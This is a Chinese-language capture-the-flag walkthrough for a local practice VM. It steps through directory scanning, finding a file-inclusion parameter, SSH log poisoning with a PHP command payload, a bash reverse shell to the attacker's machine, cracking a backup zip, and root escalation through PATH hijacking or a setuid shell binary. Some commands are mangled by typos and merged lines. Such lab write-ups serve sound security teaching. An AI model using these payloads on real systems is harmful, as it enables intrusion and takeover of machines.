前言





欲善其事,必先利其器。学习好渗透最重要的是就是实践,我们可以通过在本地搭建靶场来作为我们的目标。通过对这些靶场的渗透练习,充分理解每个漏洞的原理。







渗透过程


1、查看kali地址

 

2、nmap扫描靶机地址


3、nmap扫描靶机开放端口


4、靶机开放80端口，进行访问web页面


5、使用gobuster进行扫描目录

gobuster dir -u http://192.168.212.186/ -w ./1.txt -x html,txt,php


6、挨个访问下，发现task页面，说了需要完成的任务

7、访问blog-post文件，randy 大概是个用户名


8、再进行扫描下/blog-post 目录后的东西：

gobuster dir -u http://192.168.212.186/blog-post/ -w ./1.txt -x html,txt,php


9、访问archives文件，发现一个.php文件

10、访问/blog-post/archives/randylogs.php，是一个空白页面

11、推测是在登录日志中可能存在文件包含，使用wfuzz工具找参数

wfuzz -c -w /usr/share/wfuzz/wordlist/general/big.txt -u "http://192.168.212.186/blog-post/archives/randylogs.php?FUZZ=../../../../../../etc/passwd" --hw 0


12、得到了file参数，访问/etc/passwd，可以访问


13、也可以查看日志文件


14、ssh登陆，发现会记录 ssh 登录的所有活动，那我们可以尝试添加恶意 PHP 代码作为用户名，该代码将从用户输入并执行命令。这通常称为日志中毒。

ssh '<?php system($_GET[cmd]);?>'@192.168.212.186

 

15、登陆失败之后查看日志登陆失败信息


16、查看id，进行验证

view-source:http://192.168.212.186/blog-post/archives/randylogs.php?file=/var/log/auth.log&cmd=id

 

17、可以执行ifconfig

view-source:http://192.168.212.186/blog-post/archives/randylogs.php?file=/var/log/auth.log&cmd=ifconfig

 

18、进行URL编码，反弹shell

bash -c  'bash -i >& /dev/tcp/192.168.212.45/9999 0>&1'bash%20-c%20%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.212.45%2F9999%200%3E%261%27


19、监听9999端口，获取shell


20、之前我们访问 /etc/passwd 文件时，发现有个用户 randy，大概下一步是要提权到 rangdy


21、查看系统文件，最后在 /var/backups/ 目录下发现一个 user_backup.zip，应该有关于用户的信息


22、用nc传输到kali本地进行查看



23、解压发现需要密码


24、使用fcrackzip爆破文件密码

frackzip -u -D -p /usr/share/wordlists/rockyou.txt ./usre.zip-u 是指定zip 格式-D 表示要使用字典破解-p 表示要使用那个字典破解rockyou字典为linux自带字典，在/usr/share/wordlists/文件夹下


25、爆破之后，打开password.txt发现一串字母，猜测应该是randy用户的密码


26、进行ssh登陆，登陆成功，sudo -l 这个命令可以查看有哪些命令可以执行，即不需要知道用户密码，只需验证自身权限的密码即可


27、查看下权限，为普通用户randy,需要进行提权


28、使用sudo -l命令发现可以使用root身份运行/home/randy/tools/easysysinfo文件，s权限：设置使文件在执行阶段具有文件所有者的权限，相当于临时拥有文件所有者的身份


29、查看一下easysysinfo.py文件内容，这个文件是绝对路径，如果可执行文件使用的不是绝对路径，则存在漏洞可利用


30、使用strings easysysinfo发现使用的不是绝对路径


31、进行提权

（1）第一种提权方法

在本地编辑cat文件，写入sh，给执行权限然后将路径写入到原有环境变量前（从前往后顺序匹配），这样使用cat命令时就会优先匹配此路径下的cat文件，由于文件有s权限，不用使用root身份运行也能获得root权限 

echo 'sh' > catchomod +x catexport PATH=/home/randy/tools:$PATH./easysysinfo



（2）第二种提权方法，虽然没有修改权限，但是可以使用同名文件覆盖该文件，写一个获得shell的c文件，然后编译覆盖，覆盖之后s权限也会被覆盖，所以需要使用sudo以获得root权限

 vi  ./easysysinfo.c   //进行编辑easysysinfo.c文件//以下为编辑内容#include<unistd.h>void main(){setuid(0);setgid(0);system("/bin/bash");}
gcc easysysinfo.c -o easysysinfo //指定gcc处理结果的文件名为easysysinfosudo ./easysysinfo.c





31、成功获取到 root，在 /root 下发现了flag


32、并且还在 /root/creds 下发现了 root 密码
